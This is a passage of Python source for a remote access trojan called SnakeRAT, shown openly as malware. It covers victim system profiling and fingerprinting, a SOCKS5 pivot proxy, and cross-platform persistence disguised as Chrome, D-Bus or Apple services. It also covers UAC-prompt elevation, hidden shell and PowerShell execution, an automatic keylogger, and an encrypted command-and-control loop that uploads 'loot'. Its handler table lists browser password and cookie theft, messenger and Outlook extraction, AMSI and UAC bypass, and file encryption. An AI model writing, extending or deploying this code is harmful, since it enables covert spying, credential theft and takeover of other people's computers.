                    "fstype": partition.fstype
                }
            except:
                pass
        
        # Get network interfaces
        for interface, addrs in psutil.net_if_addrs().items():
            info["network_interfaces"][interface] = []
            for addr in addrs:
                info["network_interfaces"][interface].append({
                    "address": addr.address,
                    "netmask": addr.netmask,
                    "broadcast": addr.broadcast,
                    "family": str(addr.family)
                })
        
        # Get network connections
        try:
            info["network_connections"] = len(psutil.net_connections())
        except:
            info["network_connections"] = "Access denied"
        
        # Get users
        try:
            info["users"] = [u.name for u in psutil.users()]
        except:
            info["users"] = []
        
        return info
    
    @staticmethod
    def generate_fingerprint():
        """Generate unique machine fingerprint (cross-platform)"""
        fingerprint_data = []
        
        # Add system-specific identifiers
        fingerprint_data.append(platform.node())
        fingerprint_data.append(platform.machine())
        
        # Add MAC address if available
        mac = SystemProfiler.get_mac_address()
        if mac:
            fingerprint_data.append(mac)
        
        # Add disk serial if possible (platform-specific)
        if IS_WINDOWS:
            try:
                import wmi
                c = wmi.WMI()
                for disk in c.Win32_DiskDrive():
                    fingerprint_data.append(disk.SerialNumber)
            except:
                pass
        elif IS_LINUX:
            try:
                with open('/etc/machine-id', 'r') as f:
                    fingerprint_data.append(f.read().strip())
            except:
                pass
        elif IS_MAC:
            try:
                result = subprocess.run(['ioreg', '-l'], capture_output=True, text=True)
                fingerprint_data.append(result.stdout)
            except:
                pass
        
        fingerprint = '_'.join(str(x) for x in fingerprint_data if x)
        return hashlib.sha256(fingerprint.encode()).hexdigest()[:16]
    
    @staticmethod
    def get_mac_address():
        """Get primary MAC address"""
        try:
            for interface in netifaces.interfaces():
                if interface != 'lo':
                    addrs = netifaces.ifaddresses(interface)
                    if netifaces.AF_LINK in addrs:
                        return addrs[netifaces.AF_LINK][0]['addr']
        except:
            pass
        
        # Fallback method
        try:
            import uuid
            return ':'.join(['{:02x}'.format((uuid.getnode() >> ele) & 0xff) 
                            for ele in range(0, 8*6, 8)][::-1])
        except:
            return "00:00:00:00:00:00"
    
    @staticmethod
    def get_public_ip():
        """Get public IP address with multiple fallbacks"""
        services = ['https://api.ipify.org', 'https://ifconfig.me/ip', 'https://ident.me', 'https://httpbin.org/ip']
        for url in services:
            try:
                import requests
                return requests.get(url, timeout=5).text.strip()
            except:
                try:
                    # Native fallback (Linux/macOS)
                    import subprocess
                    if not IS_WINDOWS:
                        return subprocess.check_output(['curl', '-s', url], timeout=5).decode().strip()
                except: continue
        return "Unknown"
    
    @staticmethod
    def get_installed_packages():
        """Get list of installed Python packages (limited for stability)"""
        try:
            # Only collect for small environments; bypass for large ones to prevent bloat
            pkgs = []
            for d in list(importlib.metadata.distributions())[:100]: # Cap at 100
                pkgs.append(f"{d.metadata['Name']}=={d.version}")
            return pkgs
        except:
            return []

class SocksProxy:
    """Simple SOCKS5 Proxy Server for pivot"""
    def __init__(self, host='0.0.0.0', port=1080):
        self.host = host
        self.port = port
        self.running = False
        self.server = None # type: socket.socket | None

    def start(self):
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        try:
            self.server.bind((self.host, self.port))
            self.server.listen(5)
            self.running = True
            threading.Thread(target=self._accept_loop, daemon=True).start()
            return True, f"SOCKS5 proxy started on {self.host}:{self.port}"
        except Exception as e:
            return False, str(e)

    def stop(self):
        self.running = False
        if self.server:
            self.server.close()
        return True, "SOCKS5 proxy stopped"

    def _accept_loop(self):
        while self.running:
            try:
                client, addr = self.server.accept()
                threading.Thread(target=self._handle_client, args=(client,), daemon=True).start()
            except: pass

    def _handle_client(self, client):
        try:
            # 1. Greeting
            greeting = client.recv(2)
            if not greeting or greeting[0] != 0x05:
                client.close()
                return
            
            # No auth
            client.sendall(b"\x05\x00")
            
            # 2. Connection Request
            data = client.recv(4)
            if not data or data[1] != 0x01: # Connect
                client.close()
                return
            
            atyp = data[3]
            if atyp == 0x01: # IPv4
                target_addr = socket.inet_ntoa(client.recv(4))
            elif atyp == 0x03: # Domain
                addr_len = client.recv(1)[0]
                target_addr = client.recv(addr_len).decode()
            else:
                client.close()
                return
                
            target_port = int.from_bytes(client.recv(2), 'big')
            
            # 3. Connect to Target
            try:
                target_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                target_sock.settimeout(10)
                target_sock.connect((target_addr, target_port))
                
                # Success response
                client.sendall(b"\x05\x00\x00\x01" + socket.inet_aton("0.0.0.0") + (0).to_bytes(2, 'big'))
                
                # 4. Forwarding
                def forward(src, dst):
                    try:
                        while self.running:
                            data = src.recv(4096)
                            if not data: break
                            dst.sendall(data)
                    except: pass
                    finally:
                        src.close()
                        dst.close()
                
                threading.Thread(target=forward, args=(client, target_sock), daemon=True).start()
                threading.Thread(target=forward, args=(target_sock, client), daemon=True).start()
                
            except Exception as e:
                # Connection refused/error
                client.sendall(b"\x05\x01\x00\x01" + socket.inet_aton("0.0.0.0") + (0).to_bytes(2, 'big'))
                client.close()
                
        except:
            client.close()

class PersistenceManager:
    """Handle persistence mechanisms for different platforms"""
    
    @staticmethod
    def install_persistence():
        """Install persistence based on platform"""
        if IS_WINDOWS:
            return PersistenceManager._windows_persistence()
        elif IS_LINUX:
            return PersistenceManager._linux_persistence()
        elif IS_MAC:
            return PersistenceManager._macos_persistence()
        return False, ["Platform not supported"]
    
    @staticmethod
    def _windows_persistence():
        """Stealthy Windows persistence with multiple fallbacks"""
        results = []
        try:
            # Mask name
            mask_name = "ChromeUpdate"
            hidden_dir = os.path.join(os.environ['APPDATA'], mask_name)
            os.makedirs(hidden_dir, exist_ok=True)
            
            # Detect if running as a PyInstaller frozen exe
            is_frozen = getattr(sys, 'frozen', False)

            if is_frozen:
                # Running as .exe — copy the exe itself
                source_path = os.path.abspath(sys.executable)
                target_path = os.path.join(hidden_dir, "updater.exe")
                run_cmd = f'"{target_path}"'
            else:
                # Running as a plain .py script
                source_path = os.path.abspath(__file__)
                target_path = os.path.join(hidden_dir, "updater.pyw")
                # Find pythonw.exe for stealth
                executable = sys.executable
                parent_dir = os.path.dirname(executable)
                potential_pythonw = os.path.join(parent_dir, "pythonw.exe")
                if os.path.exists(potential_pythonw):
                    executable = potential_pythonw
                run_cmd = f'"{executable}" "{target_path}"'

            # Copy to hidden directory if not already there
            if os.path.abspath(source_path) != os.path.abspath(target_path):
                try:
                    import shutil
                    shutil.copy2(source_path, target_path)
                    results.append("File copied")
                except Exception as e:
                    results.append(f"Copy failed: {str(e)}")
                    return False, results
            
            # 1. Registry (User Run) - High reliability for USERS
            try:
                import winreg
                key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
                with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE) as key:
                    winreg.SetValueEx(key, mask_name, 0, winreg.REG_SZ, run_cmd)
                results.append("Registry Run key added")
            except Exception as e:
                results.append(f"Registry failed: {str(e)}")

            # 2. Startup Folder - Simple but effective
            try:
                startup_path = os.path.join(os.environ['APPDATA'], r"Microsoft\Windows\Start Menu\Programs\Startup")
                vbs_path = os.path.join(startup_path, f"{mask_name}.vbs")
                vbs_content = f'CreateObject("WScript.Shell").Run "{run_cmd}", 0, False'
                with open(vbs_path, 'w') as f:
                    f.write(vbs_content)
                results.append("Startup folder VBS added")
            except Exception as e:
                results.append(f"Startup folder failed: {str(e)}")

            # 3. Scheduled Task (Higher stealth, but requires RL permission)
            try:
                # Try creating a standard task first
                task_cmd = f'schtasks /create /f /tn "{mask_name}" /tr "{run_cmd.replace("\"", "\\\"")}" /sc onlogon'
                # If we are admin, try highest privilege
                if PrivilegeManager.is_admin():
                    task_cmd += ' /rl highest'
                    
                subprocess.run(task_cmd, shell=True, capture_output=True)
                results.append("Scheduled Task created")
            except Exception as e:
                results.append(f"Schtasks failed: {str(e)}")

            return True, results
        except Exception as e:
            return False, [f"Fatal persistence error: {str(e)}"]

    @staticmethod
    def get_shadow_path():
        """Get path to the persistent shadowed copy"""
        if IS_WINDOWS:
            # Use .exe extension when running as a frozen PyInstaller executable
            ext = ".exe" if getattr(sys, 'frozen', False) else ".pyw"
            filename = f"updater{ext}"
            return os.path.join(os.environ['APPDATA'], "ChromeUpdate", filename)
        elif IS_LINUX:
            return os.path.expanduser("~/.cache/.dbus-service/dbus-daemon.py")
        elif IS_MAC:
            return os.path.expanduser("~/Library/Application Support/.metadata/metadata_analysis")
        return None
    
    @staticmethod
    def _linux_persistence():
        """Stealthy Linux persistence with shadowing"""
        try:
            # Mask name
            mask_name = "dbus-service"
            hidden_dir = os.path.expanduser(f"~/.cache/.{mask_name}")
            os.makedirs(hidden_dir, exist_ok=True)
            
            # Shadow script
            target_path = os.path.join(hidden_dir, "dbus-daemon.py")
            if os.path.abspath(__file__) != target_path:
                import shutil
                shutil.copy2(os.path.abspath(__file__), target_path)
            
            # 1. User Autostart (.desktop)
            autostart_dir = os.path.expanduser("~/.config/autostart")
            os.makedirs(autostart_dir, exist_ok=True)
            desktop_content = f"""[Desktop Entry]
Type=Application
Name=D-Bus Service
Exec={sys.executable} {target_path}
Hidden=true
NoDisplay=true
X-GNOME-Autostart-enabled=true
"""
            with open(os.path.join(autostart_dir, f"{mask_name}.desktop"), 'w') as f:
                f.write(desktop_content)

            # 2. Systemd user service (Standard/Trusted)
            service_dir = os.path.expanduser('~/.config/systemd/user')
            os.makedirs(service_dir, exist_ok=True)
            service_content = f"""[Unit]
Description=D-Bus system bus daemon
After=network.target

[Service]
ExecStart={sys.executable} {target_path}
Restart=always

[Install]
WantedBy=default.target
"""
            with open(os.path.join(service_dir, f'{mask_name}.service'), 'w') as f:
                f.write(service_content)
            
            subprocess.run(['systemctl', '--user', 'daemon-reload'], capture_output=True)
            subprocess.run(['systemctl', '--user', 'enable', f'{mask_name}.service'], capture_output=True)
            
            return True, ["Desktop file created", "Systemd service enabled"]
        except Exception as e:
            return False, [f"Linux persistence failed: {str(e)}"]
    
    @staticmethod
    def _macos_persistence():
        """Stealthy macOS persistence with shadowing"""
        try:
            mask_name = "com.apple.metadata"
            hidden_dir = os.path.expanduser("~/Library/Application Support/.metadata")
            os.makedirs(hidden_dir, exist_ok=True)
            
            target_path = os.path.join(hidden_dir, "metadata_analysis")
            if os.path.abspath(__file__) != target_path:
                import shutil
                shutil.copy2(os.path.abspath(__file__), target_path)

            # Launch Agent
            plist_content = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>{mask_name}</string>
    <key>ProgramArguments</key>
    <array>
        <string>{sys.executable}</string>
        <string>{target_path}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
</dict>
</plist>'''
            
            plist_path = os.path.expanduser(f"~/Library/LaunchAgents/{mask_name}.plist")
            with open(plist_path, "w") as f:
                f.write(plist_content)
            
            subprocess.run(["launchctl", "load", plist_path], capture_output=True)
            return True, ["LaunchAgent plist created and loaded"]
        except Exception as e:
            return False, [f"macOS persistence failed: {str(e)}"]

    @staticmethod
    def remove_persistence():
        """Remove all established persistence mechanisms with detailed feedback"""
        results = []
        try:
            if IS_WINDOWS:
                mask_name = "ChromeUpdate"
                
                # 1. Registry cleanup
                try:
                    import winreg
                    for hkey in [winreg.HKEY_CURRENT_USER, winreg.HKEY_LOCAL_MACHINE]:
                        try:
                            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
                            with winreg.OpenKey(hkey, key_path, 0, winreg.KEY_ALL_ACCESS) as key:
                                winreg.DeleteValue(key, mask_name)
                                results.append(f"Registry Run key removed from {hkey}")
                        except: pass
                except Exception as e:
                    results.append(f"Registry cleanup failed: {str(e)}")

                # 2. Scheduled Task cleanup
                try:
                    res = subprocess.run(f'schtasks /delete /f /tn "{mask_name}"', shell=True, capture_output=True, text=True)
                    if res.returncode == 0:
                        results.append("Scheduled Task deleted")
                    else:
                        results.append("Scheduled Task already clean")
                except: pass

                # 3. Startup Folder cleanup
                try:
                    startup_path = os.path.join(os.environ.get('APPDATA', ''), r"Microsoft\Windows\Start Menu\Programs\Startup")
                    vbs_path = os.path.join(startup_path, f"{mask_name}.vbs")
                    if os.path.exists(vbs_path):
                        os.remove(vbs_path)
                        results.append("Startup VBS removed")
                except: pass

                # 4. Storage cleanup
                try:
                    hidden_dir = os.path.join(os.environ.get('APPDATA', ''), mask_name)
                    if os.path.exists(hidden_dir):
                        import shutil
                        shutil.rmtree(hidden_dir, ignore_errors=True)
                        results.append(f"Storage directory {mask_name} cleared")
                except: pass
                
                return True, results

            elif IS_LINUX:
                mask_name = "dbus-service"
                # 1. desktop file
                desktop_path = os.path.expanduser(f"~/.config/autostart/{mask_name}.desktop")
                if os.path.exists(desktop_path): 
                    os.remove(desktop_path)
                    results.append("Desktop entry removed")
                else:
                    results.append("Desktop entry not found")
                
                # 2. systemd
                subprocess.run(['systemctl', '--user', 'stop', f'{mask_name}.service'], capture_output=True)
                subprocess.run(['systemctl', '--user', 'disable', f'{mask_name}.service'], capture_output=True)
                service_path = os.path.expanduser(f'~/.config/systemd/user/{mask_name}.service')
                if os.path.exists(service_path): 
                    os.remove(service_path)
                    results.append("Systemd service removed")
                else:
                    results.append("Systemd service not found")
                
                # 3. Files
                hidden_dir = os.path.expanduser(f"~/.cache/.{mask_name}")
                if os.path.exists(hidden_dir):
                    import shutil
                    shutil.rmtree(hidden_dir, ignore_errors=True)
                    results.append("Shadow files removed")
                else:
                    results.append("Shadow directory not found")
                
                return True, results

            elif IS_MAC:
                mask_name = "com.apple.metadata"
                # 1. Launch Agent
                plist_path = os.path.expanduser(f"~/Library/LaunchAgents/{mask_name}.plist")
                if os.path.exists(plist_path):
                    subprocess.run(["launchctl", "unload", plist_path], capture_output=True)
                    os.remove(plist_path)
                # 2. Files
                hidden_dir = os.path.expanduser("~/Library/Application Support/.metadata")
                if os.path.exists(hidden_dir):
                    import shutil
                    shutil.rmtree(hidden_dir, ignore_errors=True)
            
            return True
        except: return False

class PrivilegeManager:
    """Detection and elevation of privileges"""
    
    @staticmethod
    def is_admin():
        """Check if running with administrative privileges"""
        try:
            if IS_WINDOWS:
                return ctypes.windll.shell32.IsUserAnAdmin() != 0
            else:
                return os.getuid() == 0
        except:
            return False

    @staticmethod
    def elevate():
        """Request elevation of privileges"""
        try:
            if PrivilegeManager.is_admin():
                return True, "Already running as admin"
            
            script = os.path.abspath(sys.argv[0])
            params = " ".join(sys.argv[1:])
            
            if IS_WINDOWS:
                # Use --takeover so the new process waits for this one to exit
                elevate_params = f'--takeover {params}'.strip()
                ret = ctypes.windll.shell32.ShellExecuteW(
                    None, "runas", sys.executable, elevate_params, None, 1
                )
                return ret > 32, "Elevation requested (UAC prompt shown)"
            
            elif IS_LINUX:
                # Try pkexec (GUI) or sudo (CLI)
                commands = [
                    ['pkexec', sys.executable, script] + sys.argv[1:],
                    ['sudo', '-n', sys.executable, script] + sys.argv[1:],
                ]
                
                for cmd in commands:
                    try:
                        # Start detached
                        subprocess.Popen(cmd, 
                                       stdout=subprocess.DEVNULL, 
                                       stderr=subprocess.DEVNULL,
                                       start_new_session=True)
                        return True, f"Elevation attempted with {cmd[0]}"
                    except:
                        continue
                        
                return False, "Could not find elevation utility"
                
            return False, "Elevation not supported on this OS"
        except Exception as e:
            return False, str(e)

    @staticmethod
    def delevate():
        """Drop administrative privileges (restarts as normal user)"""
        try:
            if not PrivilegeManager.is_admin():
                return True, "Already running as normal user"
            
            script = os.path.abspath(sys.argv[0])
            params = " ".join(sys.argv[1:])
            
            if IS_WINDOWS:
                # Restart without 'runas'
                subprocess.Popen([sys.executable, script] + sys.argv[1:],
                               stdout=subprocess.DEVNULL, 
                               stderr=subprocess.DEVNULL,
                               creationflags=subprocess.CREATE_NO_WINDOW if hasattr(subprocess, 'CREATE_NO_WINDOW') else 0)
                return True, "Restarting as normal user on Windows"
            
            elif IS_LINUX:
                # Try to find original user from environment or use nobody
                orig_user = os.environ.get('SUDO_USER') or os.environ.get('USER')
                if orig_user == 'root': orig_user = None # Still root?
                
                cmd = ['su', orig_user, '-c', f'{sys.executable} {script} {params}'] if orig_user else [sys.executable, script] + sys.argv[1:]
                
                subprocess.Popen(cmd, 
                               stdout=subprocess.DEVNULL, 
                               stderr=subprocess.DEVNULL,
                               start_new_session=True)
                return True, "Restarting as normal user on Linux"
                
            return False, "De-elevation not supported"
        except Exception as e:
            return False, str(e)

class CommandExecutor:
    """Cross-platform command execution"""
    active_processes = {} # cmd_id -> subprocess.Popen
    proc_lock = threading.Lock()
    
    @staticmethod
    def execute_shell(command, cwd=None, timeout=30, cmd_id='unknown'):
        """Execute shell command with better encoding handling and CWD support"""
        try:
            if IS_WINDOWS:
                shell_cmd = ['cmd.exe', '/c', command]
            else:
                shell_cmd = ['/bin/sh', '-c', command]
            
            # Use Popen to allow abortion
            proc = subprocess.Popen(
                shell_cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                cwd=cwd or os.getcwd(),
                start_new_session=not IS_WINDOWS # Linux: separate session group
            )
            
            # Register process
            with CommandExecutor.proc_lock:
                CommandExecutor.active_processes[cmd_id] = proc
            
            try:
                stdout_data, stderr_data = proc.communicate(timeout=timeout)
                # Decode with errors='replace' to avoid crashing on binary/weird output
                stdout = stdout_data.decode(errors='replace')
                stderr = stderr_data.decode(errors='replace')
                returncode = proc.returncode
            except subprocess.TimeoutExpired:
                # Still gotta kill it if we timeout
                if IS_WINDOWS:
                    subprocess.call(['taskkill', '/F', '/T', '/PID', str(proc.pid)])
                else:
                    os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
                return {'error': 'Command timeout', 'stdout': '', 'stderr': 'Timeout expired'}
            finally:
                with CommandExecutor.proc_lock:
                    if cmd_id in CommandExecutor.active_processes:
                        del CommandExecutor.active_processes[cmd_id]

            return {
                'stdout': stdout,
                'stderr': stderr,
                'returncode': returncode
            }
        except Exception as e:
            return {'error': str(e), 'stdout': '', 'stderr': str(e)}
    
    @staticmethod
    def execute_powershell(command, timeout=30):
        """Execute PowerShell command (Windows only)"""
        if not IS_WINDOWS:
            return {'error': 'PowerShell only available on Windows'}
        
        try:
            result = subprocess.run(
                ['powershell.exe', '-NonInteractive', '-WindowStyle', 'Hidden', '-Command', command],
                capture_output=True,
                text=True,
                timeout=timeout,
                creationflags=0x08000000  # CREATE_NO_WINDOW — no window on victim screen
            )
            
            return {
                'stdout': result.stdout,
                'stderr': result.stderr,
                'returncode': result.returncode
            }
        except Exception as e:
            return {'error': str(e)}

class AdvancedRAT:
    """Core RAT functionality with advanced features"""
    
    def __init__(self):
        print("[*] Init SnakeRAT Subsystems...")
        self.sock = None
        self.connected = False
        self.running = True
        self.logger = Logger(log_file='rat.log', debug=True)
        print("[*] Loading Crypto...")
        self.crypto = CryptoManager()
        print("[*] Running System Profiler...")
        self.profiler = SystemProfiler()
        self.client_id = self.profiler.generate_fingerprint()
        self.current_server_index = 0
        self.retry_count = 0
        self.command_handlers = self._setup_command_handlers()
        
        self.keylog_running = False
        self.keylog_listener = None
        self._start_background_keylogger()
        
        # Task & Process tracking for Abort feature
        # Task & Process tracking for Abort feature
        self.active_tasks = {} # task_id -> {type, thread/process, start_time}
        self.active_lock = threading.Lock()
        
        # Shell state
        self.shell_cwd = os.getcwd()
        self.socks_proxy = None
        self.keylog_buffer = []
        self.sock_lock = threading.Lock()
        
        self.logger.info(f"Initialized SnakeRAT v3.1 | ID: {self.client_id}")
        
        # All data encrypted with this master key
        self.crypto = CryptoManager() 
        
        self.sock_lock = threading.Lock()
        
        self.heartbeat_thread = None
        self._webcam_streaming = False
        self._window_logger_running = False
        self._window_log_buffer = []  # List of {time, title} dicts
        self._streaming = False
        self._autorun_file = os.path.join(os.getenv('APPDATA') if IS_WINDOWS else os.path.expanduser('~'), '.snake_autorun')
        
        # Load and run autorun commands
        self._run_autorun()
        
        # Start connection thread
        self.connect_thread = threading.Thread(target=self._connection_loop, daemon=True)
        self.connect_thread.start()
    
    def _setup_command_handlers(self):
        """Setup all command handlers"""
        return {
            'shell': self._handle_shell,
            'powershell': self._handle_powershell,
            'download': self._handle_download,
            'upload': self._handle_upload,
            'write_file': self._handle_write_file,
            'screenshot': self._handle_screenshot,
            'webcam': self._handle_webcam,
            'microphone': self._handle_microphone,
            'keylog': self._handle_keylog,
            'persistence': self._handle_persistence,
            'unpersist': self._handle_unpersist,
            'process': self._handle_process,
            'file_browser': self._handle_file_browser,
            'port_scan': self._handle_port_scan,
            'system_info': self._handle_system_info,
            'reverse_shell': self._handle_reverse_shell,
            'clean_traces': self._handle_clean_traces,
            'self_destruct': self._handle_self_destruct,
            'elevate': self._handle_elevate,
            'unelevate': self._handle_unelevate,
            'abort': self._handle_abort,
            'socks': self._handle_socks_proxy,
            'service': self._handle_service,
            'registry': self._handle_registry,
            'open_url': self._handle_open_url,
            'message_box': self._handle_message_box,
            'clipboard': self._handle_clipboard,
            'wallpaper': self._handle_wallpaper,
            'power': self._handle_power,
            'wifi_passwords': self._handle_wifi_passwords,
            'browser_passwords': self._handle_browser_passwords,
            'browser_cookies': self._handle_browser_cookies,
            'chromelevator': self._handle_chromelevator,
            'file_crypt': self._handle_file_crypt,
            'amsi_bypass': self._handle_amsi_bypass,
            'netstat': self._handle_netstat,
            'arp': self._handle_arp,
            'av_discovery': self._handle_av_discovery,
            'list_drives': self._handle_list_drives,
            'active_window': self._handle_active_window,
            'stream': self._handle_stream,
            'set_autorun': self._handle_set_autorun,
            'extract_discord': self._handle_extract_discord,
            'extract_telegram': self._handle_extract_telegram,
            'extract_outlook': self._handle_extract_outlook,
            'uac_bypass': self._handle_uac_bypass,
            'input_control': self._handle_input_control,
            'block_input': self._handle_block_input,
            'webcam_stream': self._handle_webcam_stream,
            'window_logger': self._handle_window_logger,
            'enable_rdp': self._handle_enable_rdp
        }
    
    def _send_encrypted(self, data):
        """Send encrypted data to C2 with robust locking and error handling"""
        if not self.sock:
            return False
        
        def json_safe(obj):
            if isinstance(obj, (set, frozenset)): return list(obj)
            if isinstance(obj, bytes): return obj.decode(errors='replace')
            return str(obj)
        
        try:
            if isinstance(data, dict):
                data['client_id'] = self.client_id
                data['timestamp'] = time.time()
            
            # Use static encryption
            payload = json.dumps(data, default=json_safe)
            encrypted = self.crypto.encrypt(payload)
            msg = len(encrypted).to_bytes(4, 'big') + encrypted
            
            with self.sock_lock:
                if self.sock:
                    self.sock.sendall(msg)
                    return True
            return False
        except (socket.error, ConnectionError) as e:
            # We don't set self.sock = None here to avoid race conditions.
            # The _connection_loop will handle cleanup on failure.
            self.logger.error(f"Socket error in _send_encrypted: {e}")
            self.connected = False
            return False
        except Exception as e:
            self.logger.error(f"_send_encrypted error: {e}")
            return False

    def _send_loot(self, loot_type, data, filename=None):
        """Send loot (screenshot/webcam/audio/files) to C2"""
        if not self.connected or not self.sock:
            return False
            
        try:
            self.logger.info(f"Sending {loot_type} loot to C2...")
            loot_msg = {
                'type': 'loot',
                'loot_type': loot_type,
                'data': base64.b64encode(data).decode(),
                'filename': filename
            }
            return self._send_encrypted(loot_msg)
        except Exception as e:
            self.logger.error(f"Failed to send loot: {str(e)}")
            return False
    
    def _start_background_keylogger(self):
        """Start keylogger in background thread"""
        if self.keylog_running:
            return
            
        def run_keylogger():
            try:
                import pynput
                from pynput import keyboard
                
                def on_press(key):
                    try:
                        k = None
                        
                        # 1. Try to get character directly (KeyCode)
                        if hasattr(key, 'char') and key.char is not None:
                            k = key.char
                        
                        # 2. Fallback to string representation (handles quoted 'a', etc.)
                        if k is None:
                            k_name = str(key).strip()
                            if k_name.startswith("'") and k_name.endswith("'") and len(k_name) == 3:
                                k = k_name[1:-1]
                            elif k_name.startswith("Key."):
                                k_name = k_name.replace('Key.', '').lower()
                                mapping = {
                                    'space': ' ',
                                    'enter': '\n',
                                    'backspace': '[BS]',
                                    'tab': '[TAB]',
                                    'shift': '[SHIFT]',
                                    'shift_l': '[SHIFT]',
                                    'shift_r': '[SHIFT]',
                                    'ctrl': '[CTRL]',
                                    'ctrl_l': '[CTRL]',
                                    'ctrl_r': '[CTRL]',
                                    'alt': '[ALT]',
                                    'alt_l': '[ALT]',
                                    'alt_r': '[ALT]',
                                    'caps_lock': '[CAPS]',
                                    'esc': '[ESC]',
                                    'up': '[UP]',
                                    'down': '[DOWN]',
                                    'left': '[LEFT]',
                                    'right': '[RIGHT]'
                                }
                                k = mapping.get(k_name, f'[{k_name}]')
                            else:
                                # Last resort: raw name in brackets
                                k = f'[{k_name}]'
                        
                        if k:
                            self.keylog_buffer.append(k)
                            # Clip buffer at 10k chars
                            if len(self.keylog_buffer) > 10000:
                                self.keylog_buffer = self.keylog_buffer[-10000:]
                    except:
                        pass

                # Diagnostic: Log session type for Linux
                if IS_LINUX:
                    session = os.environ.get('XDG_SESSION_TYPE', 'unknown')
                    self.logger.debug(f"Keylogger starting on Linux ({session})")
                    if session == 'wayland':
                        self.logger.warning("Keylogger might require root/input permissions on Wayland")

                self.keylog_running = True
                with keyboard.Listener(on_press=on_press) as listener:
                    self.keylog_listener = listener
                    listener.join()
            except Exception as e:
                self.logger.error(f"Background keylogger error: {e}")
                self.keylog_running = False
            finally:
                self.keylog_running = False
                self.keylog_listener = None

        kl_thread = threading.Thread(target=run_keylogger, daemon=True)
        kl_thread.start()
        self.logger.info("Background keylogger started")

    def _stop_background_keylogger(self):
        """Stop the background keylogger listener"""
        if not self.keylog_running:
            return False
            
        try:
            self.keylog_running = False
            if self.keylog_listener:
                self.keylog_listener.stop()
                self.keylog_listener = None
            return True
        except Exception as e:
            self.logger.error(f"Error stopping keylogger: {e}")
            return False

    def _recv_command(self, use_master=False):
        """Receive and decrypt command from C2"""
        if not self.sock:
            return None
        
        try:
            len_data = self._recv_exactly(4)
            if not len_data: return None
            
            msg_len = int.from_bytes(len_data, 'big')
            encrypted = self._recv_exactly(msg_len)
            
            if not encrypted: return None
            
            decrypted = self.crypto.decrypt(encrypted)
            return json.loads(decrypted.decode())
        except: return None
    
    def _recv_exactly(self, length):
        """Receive exactly N bytes"""
        data = b''
        while len(data) < length:
            try:
                chunk = self.sock.recv(min(length - len(data), 4096))
                if not chunk:
                    return None
                data += chunk
            except socket.timeout:
                if not self.running or not self.connected:
                    return None
                continue
            except Exception:
                return None
        return data
    
    def _heartbeat_loop(self):
        """Send periodic heartbeats to keep connection alive"""
        while self.running:
            if self.connected and self.sock:
                try:
                    # Only send if we are fully initialized (prevent clobbering init)
                    self._send_encrypted({'type': 'heartbeat'})
                except: pass
            time.sleep(10)
    def _connection_loop(self):
        """Main connection loop with failover and mandatory backoff"""
        while self.running:
            try:
                server = C2_SERVERS[self.current_server_index]
                
                self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.sock.settimeout(300) # 5m timeout to handle server idle
                
                # Disable Nagle's algorithm for faster responses
                try:
                    self.sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                except:
                    pass
                    
                self.logger.info(f"Attempting to connect to {server['host']}:{server['port']}...")
                self.sock.connect((server['host'], server['port']))
                
                self.connected = True
                self.retry_count = 0
                self.logger.success(f"Connected to C2 server: {server['host']}:{server['port']}")
                
                # Pre-collect info to minimize time socket sits idle before first message
                # This prevents [WinError 10053] where the server times out the handshake
                self.logger.info("Preparing system profile...")
                try:
                    sys_info = self.profiler.get_system_info()
                except:
                    sys_info = {"error": "info_gathering_failed"}

                self.logger.info("Initializing connection with master key...")
                sent = self._send_encrypted({'type': 'init', 'client_id': self.client_id, 'info': sys_info})
                
                if sent:
                    self.logger.success("Session secured with master encryption.")
                    
                    # Start heartbeats only after session is confirmed
                    self.heartbeat_thread = threading.Thread(target=self._heartbeat_loop, daemon=True)
                    self.heartbeat_thread.start()
                    
                    # Start command loop
                    self._command_loop()
                else:
                    self.logger.error("Failed to send initialization message")
                    self.connected = False
                
            except Exception as e:
                self.connected = False
                self.sock = None
                self.logger.error(f"Connection failed: {str(e)}")
                
                # Priority connection: try the first server more often
                if self.retry_count < 3:
                    self.current_server_index = 0
                else:
                    self.current_server_index = (self.current_server_index + 1) % len(C2_SERVERS)
                
                self.retry_count += 1
            
            # Clean up and mandatory sleep before next attempt
            self.connected = False
            if self.sock:
                try: self.sock.close()
                except: pass
                self.sock = None
            
            # Always wait 5 seconds before trying to reconnect
            time.sleep(5)

    
    def _command_loop(self):
        """Process commands from C2"""
        while self.connected and self.running:
            try:
                cmd = self._recv_command()
                if not cmd:
                    self.logger.warning("Connection closed by C2 server")
                    self.connected = False
                    break
                
                self.logger.debug(f"Received command: {cmd}")
                cmd_type = cmd.get('type', '')
                cmd_id = cmd.get('id', 'unknown')
                
                if cmd_type in self.command_handlers:
                    handler = self.command_handlers[cmd_type]
                    
                    result_thread = threading.Thread(
                        target=self._execute_command,
                        args=(handler, cmd, cmd_id)
                    )
                    result_thread.daemon = True
                    result_thread.start()
                else:
                    self._send_encrypted({
                        'type': 'error',
                        'command_id': cmd_id,
                        'error': f'Unknown command: {cmd_type}'
                    })
                    
            except Exception as e:
                self.logger.error(f"Error in command loop: {e}")
                self.connected = False
                break

    
    def _execute_command(self, handler, cmd, cmd_id):
        """Execute command and send result with task tracking"""
        cmd_type = cmd.get('type', 'unknown')
        
        # Register task
        with self.active_lock:
            self.active_tasks[cmd_id] = {
                'type': cmd_type,
                'start_time': time.time(),
                'thread': threading.current_thread()
            }
            
        try:
            self.logger.info(f"Executing command: {cmd_type} (ID: {cmd_id})")
            
            # Extract params and merge with top-level metadata for handler compatibility
            params = cmd.get('params', {})
            cmd_context = {**params, **cmd, '_cmd_id': cmd_id}
            
            result = handler(cmd_context)
            
